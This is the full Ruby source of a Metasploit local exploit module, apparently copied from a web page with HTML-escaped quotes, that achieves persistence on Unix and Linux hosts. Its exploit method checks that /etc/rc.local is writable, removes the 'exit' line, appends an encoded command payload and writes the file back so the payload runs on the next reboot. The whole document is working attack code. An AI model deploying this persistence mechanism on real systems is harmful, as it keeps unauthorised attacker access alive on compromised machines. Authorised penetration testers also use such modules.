# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;rc.local Persistence&#039;,
      &#039;Description&#039;    => %q(
        This module will edit /etc/rc.local in order to persist a payload.
        The payload will be executed on the next reboot.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [ &#039;Eliott Teissonniere&#039; ],
      &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;linux&#039; ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        => {
        &#039;BadChars&#039;   => "#%\n",
        &#039;Compat&#039;     => {
          &#039;PayloadType&#039;  => &#039;cmd&#039;,
          &#039;RequiredCmd&#039;  => &#039;generic python ruby netcat perl&#039;
        }
      },
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 0, &#039;DisablePayloadHandler&#039; => &#039;true&#039; },
      &#039;DisclosureDate&#039; => &#039;Oct 01 1980&#039;, # The rc command appeared in 4.0BSD.
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;DefaultTarget&#039;  => 0
    ))
  end

  def exploit
    unless cmd_exec("test -w &#039;/etc/rc.local&#039; && echo true").include? &#039;true&#039;
      fail_with Failure::BadConfig, &#039;/etc/rc.local is not writable&#039;
    end

    print_status(&#039;Reading /etc/rc.local&#039;)

    # read /etc/rc.local, but remove `exit 0`
    rc_local = read_file(&#039;/etc/rc.local&#039;).gsub(/^exit.*$/, &#039;&#039;)

    # add payload and put back `exit 0`
    rc_local << "\n#{payload.encoded}\nexit 0\n"

    # write new file
    print_status(&#039;Patching /etc/rc.local&#039;)
    write_file(&#039;/etc/rc.local&#039;, rc_local)
  end
end

